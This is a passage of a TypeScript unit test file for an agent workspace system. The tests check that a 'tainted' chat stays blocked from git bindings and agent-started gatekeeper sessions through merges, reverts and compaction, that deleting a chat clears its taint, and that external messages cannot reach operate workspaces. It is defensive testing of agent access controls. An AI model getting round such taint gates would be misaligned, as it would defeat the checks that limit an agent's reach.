    impl.storage.gadgets.put({ type: "gadget", id: 100, title: "App", created: new Date(0),
      bindingName: "APP", bindings: {}, commitId: c1 });
    writeTaintRow(impl, A);
    let stillGated = () => {
      expect(isConsoleToolTainted(impl.storage, A)).toBe(true);
      expect(() => impl.describeGitBinding(A, "env.GIT")).toThrow(TAINT_REFUSAL);
      expect(() => impl.startGatekeeperSession({ type: "git" }, { from: "agent", chatId: A }))
          .toThrow(TAINT_REFUSAL);
    };

    let submit = (revision: number, seq: number, change: CodeChange, pins?: object[]) =>
        impl.submitCodeChange(A, { generation: impl.storage.chatMeta.get(A).codeBase?.generation ?? 0,
          revision, clientId: "cli", seq, ...(pins ? { pins } : {}), change }, ALICE, "alice-user-do");

    await submit(0, 1, editChange(100, { "a.txt": "one\n" }, { "a.txt": "one\nedited\n" }),
        [{ gadgetId: 100, baseCommit: c1 }]);
    expect(await impl.mergeChanges(A, { profile: ALICE }, "alice-user-do")).toEqual({ outcome: "merged" });
    stillGated();

    let head = impl.storage.gadgets.get(100).commitId;
    await submit(0, 2, editChange(100, { "a.txt": "one\nedited\n" }, { "a.txt": "x\none\nedited\n" }),
        [{ gadgetId: 100, baseCommit: head }]);
    let next = await commitFiles(impl, { "a.txt": "one\nedited\nmore\n" }, [head]);
    let record = impl.storage.gadgets.get(100);
    impl.storage.gadgets.put({ ...record, commitId: next });
    await impl.updateChatFromMainline(A, ALICE);
    stillGated();

    let meta = impl.storage.chatMeta.get(A);
    let current = Object.fromEntries((await impl.getCurrentChatContent(A, meta)).get(100));
    await impl.submitCodeChange(A, { generation: meta.codeBase.generation,
      revision: meta.codeBase.revision, clientId: "cli", seq: 3,
      change: editChange(100, current, { "a.txt": "reverted\n" }) }, ALICE, "alice-user-do");
    let materialized = impl.materializeChatChanges(A);
    await impl.revertChanges(A, materialized.sequence, ALICE);
    stillGated();

    impl.commitChatCompaction(A, { chatId: A, compactedTo: impl.nextChatSequence(A), summary: "s" });
    stillGated();
  }));
});

describe("deleteChat", () => {
  it("removes the chat's taint row, and a new chat is unmarked", () =>
      withImpl(false, async (impl, instance) => {
    let ownerId = "owner-user-do";
    impl.ensureAmbientCapsules = async () => {};
    impl.markOutputsDirty = () => {};
    let client: Overseer = await instance.open(
        ownerId, "owner-profile", new NativeRpcStub<() => void>(() => {}));
    writeTaintRow(impl, A);
    writeTaintRow(impl, B);

    await client.deleteChat(A);
    expect(impl.storage.consoleToolTaints.get(A)).toBeUndefined();
    expect(isConsoleToolTainted(impl.storage, B)).toBe(true);

    let fresh = impl.nextChatId();
    expect(isConsoleToolTainted(impl.storage, fresh)).toBe(false);
  }));
});

describe("external messages", () => {
  // The gateway addresses a workspace by name (external-message-gateway.ts), and an operate
  // workspace's id is a unique id (server.ts getOperateSession), so no external message can land in
  // an operate chat. integration-tests' operate-external-messages.test.ts drives the real gateway.
  it("a gateway's workspace id is never the operate workspace's unique id", () => {
    let operateId = env.TEST_OVERSEER.newUniqueId().toString();
    for (let source of ["test", "chat-integration"]) {
      expect(env.TEST_OVERSEER.getByName(`${source}:${operateId}`).id.toString()).not.toBe(operateId);
    }
  });
});
